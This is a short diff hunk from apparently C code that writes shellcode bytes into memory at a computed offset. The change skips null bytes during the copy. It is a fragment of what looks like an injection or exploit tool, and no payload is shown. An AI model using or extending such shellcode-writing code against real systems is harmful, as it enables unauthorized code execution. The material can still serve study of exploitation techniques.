@@ -70,8 +70,8 @@ Offset where to write our shellcode : %lx\n", \
     printf("Offset : %lx\n", off);
     printf("Writing shellcode\n");
     for (int j = 0; j < len; j++) {
-        // if (tmp[j] == 0x0)
-        //     continue;
+        if (tmp[j] == 0x0)
+            continue;
         printf("\\x%02x",tmp[j]);
         ((unsigned char *)ptr + off)[j] = tmp[j];
     }
